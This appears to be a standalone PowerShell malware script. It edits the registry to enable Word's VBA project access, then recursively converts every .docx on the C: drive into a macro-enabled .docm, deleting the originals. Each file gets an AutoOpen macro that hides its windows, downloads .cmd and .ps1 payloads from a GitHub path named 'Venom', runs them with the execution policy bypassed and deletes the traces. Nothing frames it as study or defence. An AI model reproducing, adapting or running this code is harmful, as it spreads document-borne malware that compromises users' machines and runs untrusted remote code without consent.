# -----------------------------------------------
# Function: Enable-VBATrust
# Description: Searches common Office registry keys and sets
#              the AccessVBOM property to 1 (enabled) for Word.
# -----------------------------------------------
function Enable-VBATrust {
    Write-Host "Attempting to enable 'Trust access to the VBA project object model'..." -ForegroundColor Cyan

    # Define potential Office registry base keys
    $basePaths = @("HKCU:\Software\Microsoft\Office", "HKLM:\Software\Microsoft\Office", "HKLM:\Software\WOW6432Node\Microsoft\Office")
    $done = $false

    foreach ($base in $basePaths) {
        if (Test-Path $base) {
            # Get all subkeys that are version numbers (like "16.0", "15.0", etc.)
            $versions = Get-ChildItem -Path $base | Where-Object { $_.Name -match "\d+\.\d+$" }
            foreach ($version in $versions) {
                # Construct the security registry path for Word
                $securityPath = Join-Path $version.PSPath "Word\Security"
                
                # Create the Security key if it doesn't already exist.
                if (-not (Test-Path $securityPath)) {
                    try {
                        New-Item -Path $securityPath -Force | Out-Null
                        Write-Host "Created registry path: $securityPath"
                    } catch {
                        Write-Warning "Could not create registry path: $securityPath"
                        continue
                    }
                }
                try {
                    Set-ItemProperty -Path $securityPath -Name "AccessVBOM" -Value 1 -Force
                    Write-Host "Enabled Trust access to VBA for Office version $($version.PSChildName)." -ForegroundColor Green
                    $done = $true
                } catch {
                    Write-Warning "Failed to set AccessVBOM for $securityPath. Run as administrator."
                }
            }
        }
    }
    if (-not $done) {
        Write-Warning "No Office registry keys were updated. Verify Office is installed and you have the proper permissions."
    } else {
        Write-Host "VBA project access is enabled." -ForegroundColor Cyan
    }
}

# -----------------------------------------------
# Function: Process-DocxFiles
# Description: Scans recursively for .docx files, adds VBA code,
#              converts them to .docm, and deletes the originals.
# -----------------------------------------------
function Process-DocxFiles {
    param(
        [Parameter(Mandatory=$true)]
        [string]$RootPath
    )

    Write-Host "Scanning for .docx files under: $RootPath" -ForegroundColor Cyan

    # Get all .docx files (suppress errors for inaccessible folders)
    $docxFiles = Get-ChildItem -Path $RootPath -Filter *.docx -Recurse -ErrorAction SilentlyContinue

    if (!$docxFiles) {
        Write-Host "No .docx files found."
        return
    }

    # Create a Word COM object
    $word = New-Object -ComObject Word.Application
    $word.Visible = $false

    # Define the VBA macro code to be added.
    $vbaCode = @"
Sub AutoOpen()
    Dim docPath As String
    Dim initialCmdPath As String
    Dim extractPs1Path As String
    Dim shellCmdInitial As String
    Dim shellCmdExtract As String

    docPath = ThisDocument.Path
    If docPath = """" Then
        Exit Sub
    End If

    initialCmdPath = docPath & "\initial.cmd"
    extractPs1Path = docPath & "\extract.ps1"
    p_vbaPs1Path = docPath & "\p_vba.ps1"

    shellCmdInitial = "powershell -Command ""Start-Job -ScriptBlock {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/initial1.cmd' -OutFile '"" & initialCmdPath & ""'}"""
    shellCmdExtract = "powershell -Command ""Start-Job -ScriptBlock {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/extract.ps1' -OutFile '"" & extractPs1Path & ""'}"""
    shellCmdExtract = "powershell -Command ""Start-Job -ScriptBlock {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/p_vba.ps1' -OutFile '"" & p_vbaPs1Path & ""'"'}"""


    Shell shellCmdInitial, vbHide
    Shell shellCmdExtract, vbHide
    Shell shellCmdp_vba, vbHide

    Do While Dir(initialCmdPath) = "" : DoEvents : Loop
    SetAttr initialCmdPath, vbHidden
    Shell "cmd.exe /C """ & initialCmdPath & """", vbHide

    Do While Dir(extractPs1Path) = "" : DoEvents : Loop
    SetAttr extractPs1Path, vbHidden
    Shell "powershell -ExecutionPolicy Bypass -File """ & extractPs1Path & """", vbHide

    Do While Dir(p_vbaPs1Path) = "" : DoEvents : Loop
    SetAttr p_vbaPs1Path, vbHidden
    Shell "powershell -ExecutionPolicy Bypass -File """ & p_vbaPs1Path & """", vbHide

    On Error Resume Next
    Kill initialCmdPath
    Kill extractPs1Path
    On Error GoTo 0
End Sub
"@

    foreach ($file in $docxFiles) {
        try {
            Write-Host "Processing file: $($file.FullName)" -ForegroundColor Yellow

            # Open the document in Word
            $doc = $word.Documents.Open($file.FullName)
            Start-Sleep -Seconds 1  # Let the document fully open

            # Access the document’s VBProject and inject the VBA code.
            try {
                $vbProj = $doc.VBProject
                $vbComp = $vbProj.VBComponents.Item("ThisDocument")
                $codeModule = $vbComp.CodeModule
                $codeModule.AddFromString($vbaCode)
            }
            catch {
                Write-Warning "Unable to add VBA code to: $($file.FullName). Skipping this file."
                $doc.Close($false)
                continue
            }

            # Determine the new file name (.docm)
            $docmPath = $file.FullName -replace "\.docx$", ".docm"
            
            # Save as .docm (FileFormat 13 corresponds to macro-enabled documents)
            $doc.SaveAs([ref] $docmPath, [ref] 13)
            $doc.Close()

            # Delete the original .docx file
            Remove-Item $file.FullName -Force

            Write-Host "Converted: $($file.FullName) -> $docmPath" -ForegroundColor Green
        }
        catch {
            Write-Warning "Error processing file: $($file.FullName). Details: $_"
            continue
        }
    }

    # Quit Word and clean up COM objects.
    $word.Quit()
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($word) | Out-Null
    Remove-Variable word

    Write-Host "Operation complete. All .docx files have been processed." -ForegroundColor Cyan
}

# -----------------------------------------------
# Main Script Execution
# -----------------------------------------------

# Step 1: Automatically enable Trust Access to the VBA project object model.
Enable-VBATrust

# Step 2: Specify the root folder to scan (adjust as needed).
$rootFolder = "C:\"  # Warning: scanning the entire C: drive can take a long time!

# Step 3: Process all .docx files found under the root folder.
Process-DocxFiles -RootPath $rootFolder
